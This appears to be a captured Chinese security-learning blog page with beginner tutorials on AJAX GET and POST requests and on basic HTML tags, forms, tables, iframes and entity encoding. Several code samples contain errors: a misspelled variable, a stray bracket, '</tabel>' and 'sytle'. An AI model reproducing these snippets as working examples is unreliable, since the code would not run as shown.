+<h3 id="请求实现-get请求"><a href="#请求实现-get请求" class="headerlink" title="请求实现-get请求"></a>请求实现-get请求</h3><p>（1）一个简单的GET请求：</p>
+<pre><code>var xmlthhp = new XMLHttpRequest   //创建的xmlthhp是XMLHttpRequest类的对象
+
+xmlhttp.open(&quot;GET&quot;,&quot;demo_get.asp&quot;,true);
+xmlhttp.send();</code></pre>
+<p>（2）通过GET方法发送信息，请向URL添加信息：</p>
+<pre><code>xmlhttp.open(&quot;GET&quot;,&quot;demo_get2.asp?fname=Bill&amp;lname=Gates&quot;,true);
+xmlhttp.send();</code></pre>
+<p>（3）AJAX请求代码</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;Document&lt;/title&gt;
+    &lt;script type=&quot;text/javascript&quot;&gt;
+    function loadXMLDoc()&#123;
+        var xmlhttp;
+        if (window.XMLHttpRequest)&#123;
+            xmlhttp=new XMLHttpRequest();
+        &#125;
+        else&#123;
+            xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+        &#125;
+        xmlhttp.onreadystatechange=function()&#123;
+            if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)&#123;
+                document.getElementById(&quot;myDiv&quot;).innerHTML=xmlhttp.responseText;
+            &#125;
+        &#125;
+        xmlhttp.open(&quot;GET&quot;,&quot;/ajax/demo_get2.asp?fname=Bill&amp;name=Gates&quot;,true);]
+        xmlhttp.send();
+    &#125;
+    &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h2&gt;AJAX&lt;/h2&gt;
+    &lt;button type=&quot;button&quot; onclick=&quot;loadXMLDoc()&quot;&gt;请求数据&lt;/button&gt;
+    &lt;div id=&quot;myDiv&quot;&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<h3 id="请求实现-POST请求"><a href="#请求实现-POST请求" class="headerlink" title="请求实现-POST请求"></a>请求实现-POST请求</h3><p>（1）一个简单的POST请求：</p>
+<pre><code>xmlhttp.open(&quot;POST&quot;,&quot;demo_post.asp&quot;,true);
+xmlhttp.send();</code></pre>
+<p>（2）若需要像HTML表单那样POST数据，可以使用setRequestHeader()来添加HTTP头。然后在send()方法中规定想要发送的数据：</p>
+<pre><code>xmlhttp.open(&quot;POST&quot;,&quot;ajax_test.asp&quot;,true);
+xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+xmlhttp.send(&quot;fname=Bill&amp;lname=Gates&quot;);</code></pre>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>setRequestHeader(header,value)</td>
+<td>向请求添加HTTP头                                                                                                           (1)header：规定头的名称                                                                                          (2)value：规定头的值</td>
+</tr>
+</tbody></table>
+<p>（3）AJAX请求代码</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;Document&lt;/title&gt;
+    &lt;script type=&quot;text/javascript&quot;&gt;
+    function loadXMLDoc()&#123;
+        var xmlhttp;
+        if (window.XMLHttpRequest)&#123;
+            xmlhttp=new XMLHttpRequest();
+        &#125;
+        else&#123;
+            xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+        &#125;
+        xmlhttp.onreadystatechange=function()&#123;
+            if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)&#123;
+                document.getElementById(&quot;myDiv&quot;).innerHTML=xmlhttp.responseText;
+            &#125;
+        &#125;
+        xmlhttp.open(&quot;POST&quot;,&quot;ajax_test.asp&quot;,true);
+        xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+        xmlhttp.send(&quot;fname=Bill&amp;lname=Gates&quot;);
+    &#125;
+    &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h2&gt;AJAX&lt;/h2&gt;
+    &lt;button type=&quot;button&quot; onclick=&quot;loadXMLDoc()&quot;&gt;请求数据&lt;/button&gt;
+    &lt;div id=&quot;myDiv&quot;&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>扩展：</p>
+<h2 id="AJAX的GET请求"><a href="#AJAX的GET请求" class="headerlink" title="AJAX的GET请求"></a>AJAX的GET请求</h2><pre><code class="javascript">function ajax1()&#123;
+    //1.创建一个XMLHttpRequest对象
+    //打开浏览器
+    var xmlhttp = new XMLHttpRequest()
+    //2.使用open方法，表明请求的方式
+    //在浏览器上输入请求的URL
+        //1.GET/POST
+        //2.page
+        //3.true 异步
+    xmlhttp.open(&quot;GET&quot;,&quot;./AJAX_Back.html&quot;,true)
+    //3.使用send方法，发送请求的数据
+    //敲下回车，发送数据
+    xmlhttp.send()
+    //4.判断ajax是否从请求的页面中收到了数据
+    //当网页给响应时，将响应显示在页面上
+    xmlhttp.onload=function()&#123;
+        //xmlhttp.responeseText用于获取ajax接收到的响应
+        document.querySelectorAll(&quot;.container&quot;)[0].innerHTML=xmlhttp.responseText
+    &#125;
+&#125;</code></pre>
+<h2 id="AJAX的POST请求"><a href="#AJAX的POST请求" class="headerlink" title="AJAX的POST请求"></a>AJAX的POST请求</h2><p>post请求特征：</p>
+<ul>
+<li>post请求Header部分一定会存在一个字段Content-Type，用于判断post提交数据的类型</li>
+<li>如果post请求提交的是一串数据，则Content-Type: application/x-www-form-urlencoded</li>
+</ul>
+<pre><code class="javascript">function ajax1()&#123;
+    //1.创建一个XMLHttpRequest对象
+    //打开浏览器
+    var xmlhttp = new XMLHttpRequest()
+    //2.使用open方法，表明请求的方式
+    //在浏览器上输入请求的URL
+        //1.GET/POST
+        //2.page
+        //3.true
+    xmlhttp.open(&quot;POST&quot;,&quot;./AJAX_Back.html&quot;,true)
+    //3.使用setRequestHeader方法，设置请求头，表示需要提交数据
+    xmlhttp.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;)
+    //3.使用send方法，发送请求的数据.POSTData表示需要发送的数据
+    //敲下回车，发送数据
+    xmlhttp.send(&quot;POSTData&quot;)
+    //4.判断ajax是否从请求的页面中收到了数据
+    //当网页给响应时，将响应显示在页面上
+    xmlhttp.onload=function()&#123;
+        //xmlhttp.responeseText用于获取ajax接收到的响应
+        document.querySelectorAll(&quot;.container&quot;)[0].innerHTML=xmlhttp.responseText
+    &#125;
+&#125;</code></pre>
+<h2 id="AJAX请求数据库"><a href="#AJAX请求数据库" class="headerlink" title="AJAX请求数据库"></a>AJAX请求数据库</h2><p>浏览器触发AJAX请求–&gt;使用AJAX请求对后端HTML(PHP)页面进行请求–&gt;使用PHP语句向MySQL数据库进行请求–&gt;MySQL将数据响应给PHP页面–&gt;PHP页面将数据响应给前端AJAX请求的页面–&gt;AJAX将得到的请求显示在浏览器上。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/03/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/JavaScript%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-安全进阶/HTML代码进阶" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/03/15/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/HTML%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/">HTML代码进阶</a>
+    </h1>
+  
+
+        
+        <a href="/2021/03/15/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/HTML%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/" class="archive-article-date">
+  	<time datetime="2021-03-15T06:47:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="网站前端架构介绍"><a href="#网站前端架构介绍" class="headerlink" title="网站前端架构介绍"></a>网站前端架构介绍</h2><h3 id="WEB应用的基本架构"><a href="#WEB应用的基本架构" class="headerlink" title="WEB应用的基本架构"></a>WEB应用的基本架构</h3><p><img src="https://i.loli.net/2021/03/15/52cAsmaUxB4gwnF.png" alt="image-20210315145057858"></p>
+<h3 id="从网页制作到前端开发"><a href="#从网页制作到前端开发" class="headerlink" title="从网页制作到前端开发"></a>从网页制作到前端开发</h3><p>（1）WEB1.0时代的产物是“网页制作”，这时候的网页主要是静态网页，即没有与用户进行交互，而仅仅供读者浏览的网页，例如一篇日志、博文等展示性文章。（缺乏交互性）</p>
+<p>（2）WEB2.0时代，网页有静态网页和动态网页。</p>
+<ul>
+<li>所谓动态网页，就是用户不仅可以浏览网页，还可以与服务器进行交互。例如用户登录某个网站，输入账号密码，由服务器对该用户的账号进行验证，通过验证即可成功登录。</li>
+<li>WEB2.0时代的网页不仅包含绚丽的动画、音频和视频，还可以让用户在网页中进行评论交流、上传和下载文件等。具有良好的交互性。因而不再叫做“网页制作”，而是叫“WEB前端开发”。</li>
+</ul>
+<h3 id="前端网站搭建所需环境"><a href="#前端网站搭建所需环境" class="headerlink" title="前端网站搭建所需环境"></a>前端网站搭建所需环境</h3><p>（1）Web服务程序：Apache或IIS</p>
+<p>（2）数据库服务程序：mysql或mssql</p>
+<p>（3）操作脚本引擎：PHP或JSP</p>
+<h3 id="前端架构核心技术"><a href="#前端架构核心技术" class="headerlink" title="前端架构核心技术"></a>前端架构核心技术</h3><p>（1）网页最主要由3部分组成：结构、表现和行为，目前模式是HTML、CSS和JavaScript。</p>
+<p>（2）HTML是网页的结构，便于浏览器进行解析。CSS是网页的外观，使HTML文档更美观。而JavaScript是页面的行为赋予网站一些特定的动作，如放大或缩小图片。</p>
+<p>（3）CSS（Cascading Style Sheets）,用来表现HTML文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p>
+<p>（4）HTML文档中可以嵌入css和JavaScript，也可以将css和JavaScript单独下载css或js文件中，然后引入HTML文档中。</p>
+<h2 id="HTML基本语法"><a href="#HTML基本语法" class="headerlink" title="HTML基本语法"></a>HTML基本语法</h2><h3 id="代码编写编辑器"><a href="#代码编写编辑器" class="headerlink" title="代码编写编辑器"></a>代码编写编辑器</h3><p>（1）离线编辑器：pycharm、Sublime Text3、Notepad++、vsCode</p>
+<p>（2）在线编辑器：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.jq22.com/webide/">https://www.jq22.com/webide/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tiy/t.asp">https://www.w3school.com.cn/tiy/t.asp</a></li>
+<li><a target="_blank" rel="noopener" href="https://c.runoob.com/front-end/61">https://c.runoob.com/front-end/61</a></li>
+</ul>
+<p>（3）VScode快捷键：Ctrl+/  注释、Tab   补全、Alt+B  运行。</p>
+<h3 id="HTML基本概念"><a href="#HTML基本概念" class="headerlink" title="HTML基本概念"></a>HTML基本概念</h3><p>（1）HTML指的是超文本标记语言(Hyper Text Markup Language)</p>
+<p>（2）HTML不是一种编程语言，而是一种标记语言(Markup Language)，标记语言是一套标记标签(Markup Tag)</p>
+<p>（3）HTML使用标记标签来描述网页</p>
+<p>（4）HTML标签是由尖括号包围的关键词，比如&lt;html&gt;</p>
+<p>（5）<strong>HTML标签通常是成对出现的</strong>，比如&lt;b&gt;和&lt;/b&gt;</p>
+<p>（6）<strong>标签对中第一个标签是开始标签，第二个标签是结束标签</strong></p>
+<p>（7）开始标签和结束标签也被称为开放标签和闭合标签</p>
+<p>（8）<strong>编写HTML时，不会出现报错信息，并且具有自动纠错功能。</strong></p>
+<p>PS:<strong>HTML文档通常用htm和html作为后缀名。Web浏览器的作用是读取HTML文档，并以网页的形式显示出他们。浏览器不会显示HTML标签，而是使用标签来解释页面的内容。</strong></p>
+<h3 id="HTML元素"><a href="#HTML元素" class="headerlink" title="HTML元素"></a>HTML元素</h3><p>（1）HTML元素指的是从开始标签(start tag)，到结束标签(end tag)的所有代码。</p>
+<pre><code class="html">&lt;html&gt;
+    &lt;body&gt;
+        &lt;a href=&quot;index.html&quot;&gt;首页&lt;/a&gt;
+        &lt;br&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- 上述HTML代码中，html元素中嵌套了body元素，body元素中又嵌套了a元素和br元素 --&gt;</code></pre>
+<p><img src="https://i.loli.net/2020/12/16/ahLjpODg9TUnw6I.png" alt="image-20201216201051807"></p>
+<p>（2）HTML元素语法</p>
+<ul>
+<li><p>HTML元素以开始标签(start tag)起始，以结束标签(end tag)终止</p>
+</li>
+<li><p>元素的内容是开始标签与结束标签之间的内容</p>
+</li>
+<li><p>某些HTML元素内容为空，空元素在开始标签中闭合，无结束标签</p>
+</li>
+<li><p>大多数HTML元素可拥有属性，属性总是以名称/值对的形式出现，提供了有关HTML元素的更多信息。</p>
+<p>属性总是在HTML元素的开始标签中规定；属性值应该始终被包括在引号内，双引号是最常用的，不过使用单引号也没问题。</p>
+</li>
+</ul>
+<p>（3）嵌套的HTML元素</p>
+<ul>
+<li>大多数HTML元素可以嵌套(可以包含其他HTML元素)</li>
+<li>HTML文档由嵌套的HTML元素构成</li>
+</ul>
+<p>（4）空的HTML元素</p>
+<ul>
+<li>没有内容的HTML元素被称为空元素。空元素是在开始标签中关闭的。</li>
+<li>&lt;br /&gt;就是没有关闭标签的空元素(&lt;br /&gt;标签定义换行)</li>
+</ul>
+<h3 id="常见的HTML标签"><a href="#常见的HTML标签" class="headerlink" title="常见的HTML标签"></a>常见的HTML标签</h3><p>行标签、块标签、行列块标签</p>
+<p>（1）基础标签</p>
+<table>
+<thead>
+<tr>
+<th align="center">标签</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">&lt;!DOCTYPE&gt;</td>
+<td align="center">定义文档类型</td>
+</tr>
+<tr>
+<td align="center">&lt;html&gt;</td>
+<td align="center">定义HTML文档</td>
+</tr>
+<tr>
+<td align="center">&lt;body&gt;</td>
+<td align="center">定义文档的主体</td>
+</tr>
+<tr>
+<td align="center">&lt;head&gt;</td>
+<td align="center">定义关于文档的信息，默认换行</td>
+</tr>
+<tr>
+<td align="center">&lt;meta&gt;</td>
+<td align="center">定义关于HTML文档的元信息</td>
+</tr>
+<tr>
+<td align="center">&lt;title&gt;</td>
+<td align="center">定义文档的题目</td>
+</tr>
+<tr>
+<td align="center">&lt;script&gt;</td>
+<td align="center">定义客户端脚本，元素内容编写js代码</td>
+</tr>
+<tr>
+<td align="center">&lt;style&gt;</td>
+<td align="center">元素内容编写css代码</td>
+</tr>
+</tbody></table>
+<p>（2）多媒体标签</p>
+<table>
+<thead>
+<tr>
+<th align="center">标签</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>&lt;img&gt;</strong></td>
+<td align="center"><strong>定义图像</strong></td>
+</tr>
+<tr>
+<td align="center">&lt;audio&gt;</td>
+<td align="center">定义声音内容</td>
+</tr>
+<tr>
+<td align="center">&lt;video&gt;</td>
+<td align="center">定义视频</td>
+</tr>
+</tbody></table>
+<pre><code class="html">&lt;img src=&quot;&quot;  alt=&quot;&quot;&gt;test&lt;/img&gt;
+&lt;audio src=&quot;&quot; controls&gt;&lt;/audio&gt;
+&lt;video src=&quot;&quot; controls&gt;&lt;/video&gt;
+&lt;!-- src和href表示资源路径，如果无法显示图片，浏览器将显示代替文本，即alt的值。controls代表显示控件，可以让用户手动播放音频和视频--&gt;</code></pre>
+<p>（3）表单标签</p>
+<table>
+<thead>
+<tr>
+<th align="center">标签</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>&lt;form&gt;</strong></td>
+<td align="center"><strong>定义供用户输入的HTML表单</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>&lt;input&gt;</strong></td>
+<td align="center"><strong>定义输入控件(一个输入框)</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>&lt;textarea&gt;</strong></td>
+<td align="center">定义多行的文本输入控件(一个大的多行输入框)</td>
+</tr>
+<tr>
+<td align="center"><strong>&lt;button&gt;</strong></td>
+<td align="center">定义按钮</td>
+</tr>
+<tr>
+<td align="center"><strong>&lt;select&gt;</strong></td>
+<td align="center">定义选择列表(下拉列表)</td>
+</tr>
+<tr>
+<td align="center"><strong>&lt;optgroup&gt;</strong></td>
+<td align="center">定义选择列表中的相关选项的组合</td>
+</tr>
+<tr>
+<td align="center"><strong>&lt;option&gt;</strong></td>
+<td align="center">定义选择列表中的选项</td>
+</tr>
+<tr>
+<td align="center">&lt;fieldset&gt;</td>
+<td align="center">定义围绕表单中元素的边框</td>
+</tr>
+<tr>
+<td align="center">&lt;datalist&gt;</td>
+<td align="center">定义下拉列表</td>
+</tr>
+</tbody></table>
+<pre><code class="html">&lt;html&gt;
+    &lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;/head&gt;
+&lt;form action=&quot;1.php&quot; method=&quot;GET&quot;&gt; 
+    &lt;h1&gt;个人信息填写&lt;/h1&gt;
+    &lt;!-- action表示将表单提交到哪里，method表示提交的方法(GET或POST)--&gt;
+    性别：
+    &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;&gt;男
+    &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;female&quot;&gt;女
+    &lt;!-- input定义一个输入框，根据type值的不同有不同的输入方式和内容。常用的type的值有：number(数字)text(文本)、date(日期)、email(邮件)、password(密码)、radio(单选框)、checkbox(复选框)。当参数名称name的值相同时，单选框只能选择一个，提交表单时提交value对应的值。--&gt;
+    &lt;br/&gt;
+    爱好：
+    &lt;input type=&quot;checkbox&quot; name=&quot;&quot; value=&quot;&quot;&gt;运动
+    &lt;input type=&quot;checkbox&quot; name=&quot;&quot; value=&quot;&quot;&gt;漫画
+    &lt;input type=&quot;checkbox&quot; name=&quot;&quot; value=&quot;&quot;&gt;游戏
+    &lt;br/&gt;
+    城市：
+    &lt;!-- 下拉框--&gt;
+    &lt;select name=&quot;&quot; id=&quot;&quot;&gt;
+        &lt;optgroup&gt;
+            &lt;option value=&quot;厦门&quot;&gt;厦门&lt;/option&gt;
+            &lt;option value=&quot;福州&quot;&gt;福州&lt;/option&gt;
+            &lt;option value=&quot;泉州&quot;&gt;泉州&lt;/option&gt;
+        &lt;/optgroup&gt;
+        &lt;br/&gt;
+        &lt;optgroup&gt;
+            &lt;option value=&quot;成都&quot;&gt;成都&lt;/option&gt;
+        &lt;/optgroup&gt;
+    &lt;/select&gt;
+    &lt;br/&gt;
+    个人描述：
+    &lt;textarea name=&quot;&quot; id=&quot;&quot; cols=&quot;30&quot; rows=&quot;500&quot; sytle=&quot;resize:none;&quot;&gt;&lt;/textarea&gt;
+    &lt;!-- cols表示列数，rows表示行数，浏览器显示时可随意拉伸该文本框,resize:none;表示禁止拉伸--&gt;
+    &lt;br/&gt;
+    &lt;input type=&quot;submit&quot; /&gt; &lt;!--一般用于提交表单，而不是botton标签，button一般放在form标签外面--&gt;
+    &lt;input type=&quot;reset&quot; /&gt; &lt;!--重置表单的所有数据--&gt;
+
+&lt;/form&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/21/3S2o5Fri9BMVU7f.png" alt="image-20210321093128668"></p>
+<p>（4）链接标签</p>
+<table>
+<thead>
+<tr>
+<th align="center">标签</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>&lt;a&gt;</strong></td>
+<td align="center"><strong>定义超链接</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>&lt;link&gt;</strong></td>
+<td align="center">定义文档与外部资源的关系</td>
+</tr>
+</tbody></table>
+<pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;demo.css&quot; target=&quot;_blank&quot;/&gt;
+&lt;!-- 在编写HTML代码时，可用用link标签引入css文件。href表示css文件的存放位置，URL。若HTML文件和css文件在同一个目录下，href值如上.target=&quot;_blank&quot;表示打开一个新窗口，值为_self为打开当前窗口 --&gt;</code></pre>
+<p>（5）格式标签</p>
+<table>
+<thead>
+<tr>
+<th align="center">标签</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>&lt;h1&gt;to&lt;h6&gt;</strong></td>
+<td align="center"><strong>定义HTML标题</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>&lt;p&gt;</strong></td>
+<td align="center"><strong>定义段落,默认在前后存在换行</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>&lt;br&gt;</strong></td>
+<td align="center"><strong>定义换行</strong></td>
+</tr>
+<tr>
+<td align="center">&lt;hr&gt;</td>
+<td align="center">定义水平线</td>
+</tr>
+<tr>
+<td align="center">&lt;b&gt;</td>
+<td align="center">定义粗体文本</td>
+</tr>
+<tr>
+<td align="center">&lt;big&gt;</td>
+<td align="center">定义大号文本</td>
+</tr>
+<tr>
+<td align="center">&lt;em&gt;</td>
+<td align="center">定义强调文本</td>
+</tr>
+<tr>
+<td align="center">&lt;i&gt;</td>
+<td align="center">定义斜体文本</td>
+</tr>
+<tr>
+<td align="center">&lt;pre&gt;</td>
+<td align="center">定义预格式文本</td>
+</tr>
+<tr>
+<td align="center">&lt;small&gt;</td>
+<td align="center">定义小号文本</td>
+</tr>
+<tr>
+<td align="center">&lt;font&gt;</td>
+<td align="center">定义文本的字体大小和颜色</td>
+</tr>
+</tbody></table>
+<pre><code class="html">&lt;hr color=&quot;red&quot; width=&quot;500px&quot; align=&quot;left&quot;&gt;
+&lt;!-- 水平线宽度为500像素，向左居中--&gt;
+&lt;font color=&quot;red&quot; size=&quot;18px&quot;&gt;文本&lt;/font&gt;
+&lt;!-- px为像素单位--&gt;</code></pre>
+<p>（6）样式/节标签</p>
+<table>
+<thead>
+<tr>
+<th align="center">标签</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>&lt;style&gt;</strong></td>
+<td align="center"><strong>定义文档的样式信息</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>&lt;div&gt;</strong></td>
+<td align="center"><strong>定义文档中的分隔区块</strong></td>
+</tr>
+<tr>
+<td align="center">&lt;span&gt;</td>
+<td align="center">定义文档中的节</td>
+</tr>
+</tbody></table>
+<pre><code class="html">&lt;html&gt;
+    &lt;body&gt;
+        &lt;div class=&quot;&quot; style=&quot;&quot;&gt;  &lt;!-- div作为一个块级元素，默认会占满一整行因此有换行的效果，但严格意义上说并不是换行，可以通过width，height，float等属性修改块的大小使之没有换行效果。独立成块，看成是一个容器，可在其中添加文字、图片、超链接等--&gt;
+
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>（7）表格标签</p>
+<table>
+<thead>
+<tr>
+<th align="center">标签</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">&lt;table&gt;</td>
+<td align="center">定义表格</td>
+</tr>
+<tr>
+<td align="center">&lt;caption&gt;</td>
+<td align="center">定义表格标题</td>
+</tr>
+<tr>
+<td align="center">&lt;th&gt;</td>
+<td align="center">定义表格中的表头单元格</td>
+</tr>
+<tr>
+<td align="center">&lt;td&gt;</td>
+<td align="center">定义表格中的单元格（列）</td>
+</tr>
+<tr>
+<td align="center">&lt;tr&gt;</td>
+<td align="center">定义表格中的行</td>
+</tr>
+</tbody></table>
+<p>tr：表示表格中的一行，特点：存在N个tr，则会在表格中出现N行</p>
+<p>td：表示一行中的一个单元格，特点：存在N个td，则会在该行中出现N个单元格</p>
+<pre><code class="html">&lt;html&gt;
+    &lt;body&gt;
+        &lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;50&quot; border-collapse:collapse&gt; &lt;!-- border表示设置边框的宽度，cellspacing表示外边距,为0则隐藏了外边距但还存在。cellpadding设置表格的内边距。
+
+border-collapse：属性，为表格设置合并边框模型。
+
+其属性值如下：
+
+separate：默认值。边框会被分开。
+
+collapse：将边框会合并为一个单线的边框--&gt;
+
+            &lt;!--创建一个5行5列的表格,存在5个tr，25个td--&gt;
+           &lt;caption&gt;Security&lt;/caption&gt; &lt;!--表格标题，在表格的上方居中显示--&gt;
+            &lt;tr&gt;
+               &lt;th&gt;test1&lt;/th&gt;      &lt;!-- th表示表头单元格,有加粗--&gt;
+               &lt;th&gt;test2&lt;/th&gt;
+               &lt;th&gt;test3&lt;/th&gt;
+               &lt;th&gt;test4&lt;/th&gt;
+               &lt;th&gt;test5&lt;/th&gt;
+           &lt;/tr&gt;
+            &lt;tr&gt;
+               &lt;td&gt;1&lt;/td&gt;
+               &lt;td&gt;1&lt;/td&gt;
+               &lt;td&gt;1&lt;/td&gt;
+               &lt;td&gt;1&lt;/td&gt;
+               &lt;td&gt;1&lt;/td&gt;
+           &lt;/tr&gt; 
+        &lt;/tabel&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>（8）框架标签</p>
+<table>
+<thead>
+<tr>
+<th align="center">标签</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">&lt;frame&gt;</td>
+<td align="center">定义框架集的窗口或框架</td>
+</tr>
+<tr>
+<td align="center">&lt;frameset&gt;</td>
+<td align="center">定义框架集</td>
+</tr>
+<tr>
+<td align="center"><strong>&lt;iframe&gt;</strong></td>
+<td align="center"><strong>定义内联框架</strong></td>
+</tr>
+</tbody></table>
+<pre><code class="html">&lt;html&gt;
+    &lt;head&gt;
+        &lt;style&gt;
+            iframe&#123;
+
+            &#125;
+        &lt;/style&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;iframe src=&quot;&quot; frameborder=&quot;0&quot; width=&quot;1000px&quot;  height=&quot;100%&quot;&gt;  
+            &lt;!--iframe 内联框架，块级元素，有宽度和高度,可以在当前网页内引入另一个网页的资源,可加载并显示其他网页的内容,frameborder=0表示关闭边框，为1显示边框。高度和宽度值设置为100%表示占满全屏 --&gt;
+
+        &lt;/iframe&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>参考链接:<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tags/index.asp">https://www.w3school.com.cn/tags/index.asp</a></p>
+<h3 id="HTML注释"><a href="#HTML注释" class="headerlink" title="HTML注释"></a>HTML注释</h3><p>（1）注释标签&lt;!– 与 –&gt; 用于在HTML插入注释</p>
+<pre><code class="html">&lt;!-- 在此处写注释 --&gt;</code></pre>
+<p>（2）注释：在开始标签中有一个惊叹号，但是结束标签中没有。</p>
+<p>（3）浏览器不会显示注释，但是能够帮助记录HTML文档。</p>
+<p>（4）可以利用注释在HTML中放置通知和提醒信息。</p>
+<h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><p>（1）HTML实体编码，也即HTML中的转义字符</p>
+<ul>
+<li>在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。</li>
+<li>如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。</li>
+<li>字符实体类似：&entity_name;或者&#entity_number;</li>
+</ul>
+<p>（2）如需显示小于号，我们必须这样写：&amp;lt; 或 &amp;#60;</p>
+<p>（3）使用实体名而不是数字的好处是，名称易于记忆。不过坏处是，浏览器也许并不支持所有实体名称（对实体数字的支持却很好）。</p>
+<p>（4）常见的实体编码，参考链接：<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/html/html_entities.asp">https://www.w3school.com.cn/html/html_entities.asp</a></p>
+<table>
+<thead>
+<tr>
+<th align="left">显示结果</th>
+<th align="left">描述</th>
+<th align="left">实体名称</th>
+<th align="left">实体编号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"></td>
+<td align="left">空格</td>
+<td align="left">&amp;nbsp;</td>
+<td align="left">&amp;#160;</td>
+</tr>
+<tr>
+<td align="left">&lt;</td>
+<td align="left">小于号</td>
+<td align="left">&amp;lt;</td>
+<td align="left">&amp;#60;</td>
+</tr>
+<tr>
+<td align="left">&gt;</td>
+<td align="left">大于号</td>
+<td align="left">&amp;gt;</td>
+<td align="left">&amp;#62;</td>
+</tr>
+<tr>
+<td align="left">&amp;</td>
+<td align="left">和号</td>
+<td align="left">&amp;amp;</td>
+<td align="left">&amp;#38;</td>
+</tr>
+<tr>
+<td align="left">“</td>
+<td align="left">引号</td>
+<td align="left">&amp;quot;</td>
+<td align="left">&amp;#34;</td>
+</tr>
+<tr>
+<td align="left">‘</td>
+<td align="left">撇号</td>
+<td align="left">&amp;apos; (IE不支持)</td>
